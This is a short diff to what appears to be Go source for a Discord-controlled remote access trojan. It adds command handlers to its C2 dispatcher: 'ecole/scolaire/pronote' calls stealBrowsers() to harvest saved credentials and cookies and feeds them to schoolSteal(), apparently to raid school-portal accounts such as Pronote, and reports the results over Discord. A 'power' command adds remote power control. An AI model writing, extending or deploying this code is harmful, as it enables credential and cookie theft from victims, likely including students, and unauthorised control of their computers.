@@ -517,6 +517,17 @@ func c2Execute(command string) {
 	case "rm", "suppr":
 		discordReply(deletePath(args))
 
+	case "ecole", "scolaire", "pronote":
+		discordReply("extraction scolaire → <#" + ecoleChannel() + ">…")
+		go func() {
+			creds, cookies, _, _ := stealBrowsers()
+			n := schoolSteal(creds, cookies)
+			discordReply(fmt.Sprintf("scolaire : %d élément(s).", n))
+		}()
+
+	case "power", "energie":
+		discordReply(powerControl(args))
+
 	case "diag", "test", "autotest":
 		discordReply(runDiag())
 
